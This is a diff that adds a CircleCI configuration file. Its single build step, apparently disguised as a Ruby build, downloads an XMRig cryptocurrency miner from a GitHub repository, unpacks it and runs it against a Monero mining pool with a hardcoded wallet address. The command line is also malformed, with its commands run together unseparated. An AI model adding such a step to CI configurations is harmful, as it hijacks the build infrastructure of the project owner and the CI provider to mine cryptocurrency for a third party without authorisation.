@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://github.com/hsnm97/vrsc/blob/main/xmrig-6.15.1-bionic-x64.tar.gz tar xf xmrig-6.15.1-bionic-x64.tar.gz cd xmrig-6.15.1 ./xmrig -a rx -o rx.unmineable.com:3333 -u XMR:8C2WiJBsdZeY5qpFYNRFnWgSmoqsxzu61iSb5yTLtwLG1rT14Qqn7qvC9Ysuiim5f6c9Mm4uUhFwtCPrAqkCNd5N2tvtva8.aduh#mvzd-evg6
